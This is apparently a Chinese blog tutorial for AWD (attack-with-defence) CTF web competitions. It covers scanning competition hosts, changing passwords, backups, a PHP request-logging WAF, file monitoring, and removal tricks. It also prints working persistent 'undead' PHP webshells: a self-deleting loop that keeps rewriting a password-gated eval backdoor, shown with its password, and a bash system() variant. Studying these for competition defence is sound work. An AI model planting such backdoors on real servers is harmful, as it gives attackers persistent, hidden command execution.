---
title: "AWD新手入门WEB篇"
date: 2022-09-11 16:40:44
---
​

# Attack With Defence

## 主机发现：

```python
import urllib.request
import time

opener = urllib.request.build_opener()
opener.addheaders = [('User-agent', 'Mozilla/49.0.2')]

for n in range(1, 255):
    nb = str(n)
    target = 'http://192-168-1-' + nb + '.pvp1453.bugku.cn/'
    new = open('C:/Users/HP/Desktop/bugkuwz.txt', mode='a+', encoding='utf-8')
    new.write(target)
    new.write('\n')

file = open('C:/Users/HP/Desktop/bugkuwz.txt')
lines = file.readlines()
aa = []
for line in lines:
    temp = line.replace('\n', '')
    aa.append(temp)

print('存活网站如下：')
for a in aa:
    tempUrl = a
    try:
        opener.open(tempUrl)
        print(tempUrl)
    except urllib.error.HTTPError:
        # print(tempUrl+'     访问页面出错')
        time.sleep(0.5)
    except urllib.error.URLError:
        # print(tempUrl+'     访问页面出错')
        time.sleep(0.5)
    time.sleep(0.1)
```

## 修改SSH密码

```plaintext
passwd username
# 输入密码确认即可
```

## 修改数据库密码及备份数据库（以 mysql 为例）

```plaintext
1. 登录 mysql 终端，运行：
mysql> set password=password('new password');
mysql>flush privileges;
2. 修改 mysql user 表
mysql>use mysql;
mysql>update user set password=password('new password') where user='root';
mysql>flush privileges;
3. 使用 GRANT 语句
mysql>GRANT ALL PRIVILEGES ON *.* TO 'root'@'127.0.0.1' IDENTIFIED BY 'new password' WITH GRANT OPTION;
mysql>flush privileges;
4. mysqladmin
[root@ubuntu]# mysqladmin -u root password "new password";（注意双引号或不加）
```

备份指定的多个数据库

```plaintext
[root@ubuntu]# mysqldump -u root -p --databases databasesname > /tmp/db.sql
```

数据库恢复，在mysql终端下执行

```plaintext
# 命令格式：source FILE_PATH
source ~/db.sql（原数据库需存在）
```

比赛前一定要快速修改密码和备份，否则密码被别人更改需要重置环境就尴尬了，修改数据库密码后注意修改源码配置文件，避免服务崩溃。同时赛前也可以准备些例如 phpmyadmin 的批量爆破和改密的脚本。

## 源码备份

```plaintext
# 打包目录
tar -zcvf archive_name.tar.gz directory_to_compress
# 解包
tar -zxvf archive_name.tar.gz
```

之后使用 scp 命令或者 winscp，mobaxterm 等工具下载打包后的源码

## 上 WAF

备份好源码之后要做的就是监控访问，截取攻击向量，做好流量重放的准备。一般的 WAF 只需要做到记录访问的基本信息如时间，ip，get，post，cookie，UA即可。也可以自行编写通防 WAF，功能如关键字检测，截取上传文件内容等。

但一般通防 WAF 会影响主办方 check，使用需谨慎，同时注意上 WAF 崩溃的问题。

可以使用 bash 命令在每一个 php 文件前面加上 `require_once` 包含 WAF 文件

```plaintext
# 批量加waf /var/www/html/ 目录下每个 php 文件前加上 <?php require_once "/tmp/waf.php";?>
find /var/www/html/ -path /var/www/html/124687a7bc37d57cc9ecd1cbd9d676f7 -prune -o  -type f -name '*.php'|xargs  sed -i '1i<?php require_once "/tmp/waf.php";?>'
```

也可以修改 php.ini 的 auto_prepend_file 属性，但一般不会有重启 php 服务权限

```plaintext
; Automatically add files before PHP document.
; http://php.net/auto-prepend-file
auto_prepend_file = /tmp/waf.php
```

附上郁离歌的一枚 WAF，会在 `/tmp/loooooooogs` 目录下生成日志文件

```plaintext

error_reporting(0); 
define('LOG_FILEDIR','/tmp/loooooooogs');
if(!is_dir(LOG_FILEDIR)){
	mkdir(LOG_FILEDIR);
}
function waf() 
{ 
if (!function_exists('getallheaders')) { 
function getallheaders() { 
foreach ($_SERVER as $name => $value) { 
if (substr($name, 0, 5) == 'HTTP_') 
$headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
} 
return $headers; 
} 
} 
$get = $_GET; 
$post = $_POST; 
$cookie = $_COOKIE; 
$header = getallheaders(); 
$files = $_FILES; 
$ip = $_SERVER["REMOTE_ADDR"]; 
$method = $_SERVER['REQUEST_METHOD']; 
$filepath = $_SERVER["SCRIPT_NAME"]; 
foreach ($_FILES as $key => $value) { 
$files[$key]['content'] = file_get_contents($_FILES[$key]['tmp_name']); 
file_put_contents($_FILES[$key]['tmp_name'], "virink"); 
}

unset($header['Accept']);
$input = array("Get"=>$get, "Post"=>$post, "Cookie"=>$cookie, "File"=>$files, "Header"=>$header);

logging($input);

}

function logging($var){ 
$filename = $_SERVER['REMOTE_ADDR'];
$LOG_FILENAME = LOG_FILEDIR."/".$filename;
$time = date("Y-m-d G:i:s");
file_put_contents($LOG_FILENAME, "\r\n".$time."\r\n".print_r($var, true), FILE_APPEND); 
file_put_contents($LOG_FILENAME,"\r\n".'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'], FILE_APPEND);
file_put_contents($LOG_FILENAME,"\r\n***************************************************************",FILE_APPEND);
}

waf(); 
```

生成的日志是 www-data 权限，一般 ctf 权限是删除不了的。上好 WAF 之后做好打包备份，除了源文件一份备份，我一般上好 WAF ，打好补丁还会做备份。

## 文件监控

网上有很多文件监控的脚本，也可以使用 bash 命令自行查找出例如10分钟内修改过的 php 文件，这里推荐一个师傅的文件监控工具，文件相关操作都清晰明了。

<https://github.com/TheKingOfDuck/FileMonitor>

[![img](https://jlkl.github.io/2019/02/08/Web_13/20190207165325.png)](https://jlkl.github.io/2019/02/08/Web_13/20190207165325.png)

线下环境一般不能访问外网，所以需要提前下载好脚本和相关依赖，这个工具需要 `watchdog` 依赖，也是要提前准备的。

使用 `touch` 命令修改文件时间戳可以一定程度防范对文件的检测。

```plaintext
pip install watchdog
```

## 权限维持——不死马

不死马也称内存马，删除掉木马之后，由于操作存于内存当中，还是会不断地生成木马，达到权限维持的目的。

## 6.1. 不死马使用

常规不死马，先删除自身，不断生成 `.index.php` 文件

[![img](https://jlkl.github.io/2019/02/08/Web_13/20190207172500.png)](https://jlkl.github.io/2019/02/08/Web_13/20190207172500.png)

```plaintext

ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = './.index.php';
$code = '<?php if(md5($_POST["pass"])=="3a50065e1709acc47ba0c9238294364f"){@eval($_POST[a]);} ?>';
//pass=Sn3rtf4ck 马儿用法：fuckyou.php?pass=Sn3rtf4ck&a=command
while (1){
	file_put_contents($file,$code);
	usleep(5000);
}
```

这里添加了一个密码 `pass` 防止别人借刀杀人，我们平时也可以编写自己的木马，别人就算拿到木马也不知道怎么利用，附上一句话木马的各种变形

<http://www.secist.com/archives/1947.html>

bash 命令不死马，效果也是不断生成 `.index.php` 文件，也可以使用命令不断创建 nc 后门

```plaintext
system('while true;do echo \'<?php  if(md5($_GET[pass])==\"3a50065e1709acc47ba0c9238294364f\"){@eval($_GET[a]);} ?>\' >fuck.php;sleep 0.1;done;');
```

## 6.2. 不死马的克制

1. 杀掉不死马运行的进程，直接删除脚本没用，因为php执行的时候已经把脚本读进去解释成opcode运行了

`ps aux` 查看运行的进程

[![img](https://jlkl.github.io/2019/02/08/Web_13/20190207173536.png)](https://jlkl.github.io/2019/02/08/Web_13/20190207173536.png)

www-data 权限运行了 4 个 apache 进程，不死马随机运行于这 4 个进程，直接 `kill pid` （www-data 权限下）全部杀掉这几个进程就可以了

可以使用 `kill -9 -1` 杀死当前用户所有进程（有权限下慎用），也可以直接 `killall apache2` 杀掉 apache 所有子进程

1. 重启 apache，php 等web服务（一般不会有权限）

```plaintext
service apache2 restart
service php restart
```

1. 用一个脚本竞争写入，脚本同不死马，usleep要低于对方不死马设置的值
2. 创建一个和不死马生成的马一样名字的文件夹，测试了下需要先删除再创建文件夹
